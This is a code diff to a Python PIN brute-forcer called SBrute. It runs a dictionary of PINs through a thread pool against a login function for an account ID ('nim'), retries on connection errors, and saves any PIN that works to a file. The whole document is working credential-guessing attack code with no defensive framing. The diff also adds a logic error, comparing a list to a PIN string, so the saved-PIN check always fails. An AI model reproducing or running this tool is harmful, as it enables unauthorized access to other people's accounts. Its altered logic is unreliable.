@@ -32,11 +32,15 @@ class SBrute(object):
                                     total=len(self.dictionary))
 
         self.found = False
+        self.result = []
 
         if start:
             self.start()
 
-    def login(self, pin: str, depth: int = 0, maxRetry: int = 8):
+    def login(self,
+              pin: str,
+              depth: int = 0,
+              maxRetry: int = 8):
         try:
             if self.found:
                 return
@@ -45,7 +49,9 @@ class SBrute(object):
                     if conn.login():
                         self.found = True
                         return pin
-        except (requests.ConnectTimeout, requests.ConnectionError, requests.exceptions.ChunkedEncodingError) as ex:
+        except (requests.ConnectTimeout,
+                requests.ConnectionError,
+                requests.exceptions.ChunkedEncodingError) as ex:
             logging.debug('{} occured {} {}, {} of {} retries'.format(
                 str(ex), self.nim, pin, depth, maxRetry))
 
@@ -73,25 +79,24 @@ class SBrute(object):
             except FileNotFoundError:
                 pass
             else:
-                result = self.login(pin, depth=1)
-                if result == pin:
+                self.result.append(self.login(pin, depth=1))
+                if self.result == pin:
                     logging.info('Saved pin is good.')
-                    return
                 else:
                     logging.warning('Saved pin is bad, trying normal method.')
                     os.remove(filename)
 
             with Pool(self.thread) as pool:
-                result = pool.map(self.login, self.dictionary)
-                result = list(set(result))
-                result.remove(None)
+                self.result += pool.map(self.login, self.dictionary)
 
-            self.result = result
+            self.result = list(set(self.result))
+            self.result.remove(None)
         finally:
             self.tEnd = time.time()
 
             if self.found and self.result is not None:
                 with open('found/{}'.format(self.nim), 'w') as logfile:
+                    logging.info(str(self.result))
                     logfile.write(self.result[0])
                 logmsg = 'FOUND {} {}'.format(self.nim, self.result[0])
             else:
